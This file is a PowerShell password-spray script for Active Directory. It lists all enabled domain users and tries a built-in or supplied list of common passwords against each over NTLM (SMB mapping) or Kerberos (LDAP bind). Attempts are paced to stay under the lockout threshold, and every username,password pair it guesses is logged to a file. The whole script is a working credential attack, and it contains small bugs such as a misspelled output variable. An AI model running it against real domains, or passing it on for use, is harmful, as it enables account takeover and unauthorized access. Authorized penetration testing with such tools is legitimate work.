<#
.SYNOPSIS
PowerShell based password spray.

.DESCRIPTION
This script performs a password spray atack against enabled users in a specific domain.

.PARAMETER Domain (Required)
Domain Name of your AD

.PARAMETER AuthType (Required)
Authentication type used for password spray.
Either NTLM or Kerberos

.PARAMETER AutoTune
Option when selected builds in delays to avoid locking out user accounts

.PARAMETER DomainController
Provides the name of a target domain controller 

.PARAMETER OnlyShowSuccess
Option when selected only provides output when the correct password is guessed.

.PARAMETER PasswordFile
Option to provide a list of passwords (one per line)

.PARAMETER PasswordSprayResultsFile
Option to specify a comma delimited output file for correctly guessed username & password 



.EXAMPLE
PS>.\Invoke-PasswordSpray.ps1 -Domain 'trd.com' -AuthType Kerberos

.NOTES
AUTHOR: Sean Metcalf
AUTHOR EMAIL: sean.metcalf@trustedsec.com
COPYRIGHT: 2025 
WEBSITE: https://ADSecurity.org

This script requires the following:
 * PowerShell 5.0 (minimum)
 * Windows 10/2016
 * Active Directory PowerShell Module
If the above requirements are not met, results will be inconsistent.
This script is provided as-is, without support.
#>

Param
 (
    [Parameter(Mandatory=$true)]$Domain,
    [Parameter(Mandatory=$true)][ValidateSet("NTLM", "Kerberos")]$AuthType, #Kerberos is way faster!
    [switch]$AutoTune = $True,
    [string]$DomainController,
    [switch]$OnlyShowSuccess,
    [string]$PasswordFile,
    [string]$PasswordSprayResultsFile
 )

IF ($DomainController)
 { 
    $DomainDC = $DomainController
    $RemotePath = "\\$DomainController\SYSVOL"
 }
ELSE
 {
    $DomainDCInfo = Get-ADDomainController -Discover -DomainName $Domain
    $DomainDC = $DomainDCInfo.Name
    [array]$DomainInfo = Get-ADDomain -Server $DomainDC
    $RemotePath = "\\$($DomainInfo.DNSRoot)\SYSVOL"
 }

 [array]$DomainInfo = Get-ADDomain -Server $DomainDC
 $DomainInfoDNS = $DomainInfo.DNSRoot

IF ($AutoTune -eq $True)
 { 
    $DomainPasswordPolicy = Get-ADDefaultDomainPasswordPolicy -Server $DomainDC 
     Write-Host "Lockout Threshold is $($DomainPasswordPolicy.LockoutThreshold) with an Observation window of $($DomainPasswordPolicy.LockoutObservationWindow.TotalMinutes) minutes"
    IF ($DomainPasswordPolicy.LockoutThreshold -gt 0)
     {       
        $WaitTimeInMinutes = ($DomainPasswordPolicy.LockoutObservationWindow.TotalMinutes / $DomainPasswordPolicy.LockoutThreshold) + 1
     }
    ELSE
     { $WaitTimeInMinutes = 1 }
 }

IF (!$PasswordFile)                                                                                     
 { [array]$PasswordArray = @('Password99!','Password1234','P@ssw0rd1','1234Password','Password123!','Qwerty!','Zxcvbnm!','Qwertyuiop!','1234asdf!','qwer1234!','ThisIsASecurePassword!','WilECoyote!','WrongPassword!' ) }
IF ($PasswordFile)
 { [array]$PasswordArray = Import-CSV $PasswordFile }

[array]$UserAccountArray = Get-ADUser -Filter 'Enabled  -eq $True' -Server $DomainDC 
$UserAccountArray = $UserAccountArray | Sort-Object SamAccountName

IF ($PasswordFile)
 {
    $PasswordFilePathCheck = Test-Path $PasswordFile
    IF ($PasswordFilePathCheck -eq $True)
     {
        $PWSprayUserFileCheck = Read-Host "Password Spray Output file exists ($PasswordSprayResultsFile). Overwrite? (Y/N)?"
        IF ( ($PWSprayUserFileCheck -eq 'N') -OR ($PWSprayUserFileCheck -eq 'No') )
         {
            $PWSprayFileArray = $PasswordSprayResultsFile -Split '\\'
            $PWSprayFileNameArrayCount = $PWSprayFileArray.count -1
            $PWSprayFileNameArrayText = ($PWSprayFileArray[$PWSprayFileNameArrayCount] -split '\.')[0]
            $PWSprayFileNameText = $PWSprayFileNameArrayText + '-' + $(Get-Random -min 100 -max 999)
            $PWSprayFileNewArrayUpdated = $PasswordSprayResultsFile.Replace($PWSprayFileNameArrayText, $PWSprayFileNameText)
            $PasswordSprayResultsFile = $PWSprayFileNewArrayUpdated
         }
     }
 }

"Password Spray Results for $Domain using $AuthType " | Out-File  $PassowrdSprayResultsFile

Write-Host "Password Spraying the domain $Domain using $AuthType against $($UserAccountArray.count) users using $($PasswordArray.Count) passwords..."
ForEach ($PasswordArrayItem in $PasswordArray)
 {
    # Write-host "Password spraying $($UserAccountArray.count) users with the password $PasswordArrayItem"
    ForEach ($UserAccountArrayItem in $UserAccountArray)
     {
        $username = $DomainInfo.NetBIOSName + '\' + $UserAccountArrayItem.SamAccountName

        If ($OnlyShowSuccess -ne $True)
         { Write-Host "Password spraying username $($UserAccountArrayItem.SamAccountName) with password $PasswordArrayItem" }

        IF ($AuthType -eq 'NTLM')
          { 
            TRY
             {
                $outputSMB = @()
                $password = ConvertTo-SecureString $PasswordArrayItem -AsPlainText -Force
                $cred = New-Object System.Management.Automation.PSCredential($username, $password)
                $outputSMB = New-SmbMapping -RemotePath $RemotePath -Credential $cred -ErrorAction Stop
                Remove-SmbMapping -RemotePath $RemotePath -Force
                IF ($outputSMB.Status -eq 'Ok')
                 { 
                    write-host "User $($UserAccountArrayItem.SamAccountName) has the password $PasswordArrayItem" -ForegroundColor Cyan
                    $($UserAccountArrayItem.SamAccountName) + ',' + $PasswordArrayItem | Out-File  $PasswordSprayResultsFile -Append   
                 }
             }
            CATCH
             { write-verbose "Password is incorrect" }
          }
        
        IF ($AuthType -eq 'Kerberos')
          { 
            TRY
             { 
                $outputDSDE = @()
                $outputDSDE = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$($DomainInfo.DistinguishedName)",$username,$PasswordArrayItem) 
                IF ($outputDSDE.distinguishedName)
                 { 
                    write-host "User $($UserAccountArrayItem.SamAccountName) has the password $PasswordArrayItem" -ForegroundColor Cyan
                    $($UserAccountArrayItem.SamAccountName) + ',' + $PasswordArrayItem | Out-File  $PasswordSprayResultsFile -Append 
                 }
             }
            CATCH 
             { write-verbose "Password is incorrect" }
          }
     }
    IF ($AutoTune -eq $True)
     { 
        Write-Host "Pausing $WaitTimeInMinutes minutes..."
        Start-Sleep -Seconds $($WaitTimeInMinutes * 60) 
     } 
 }
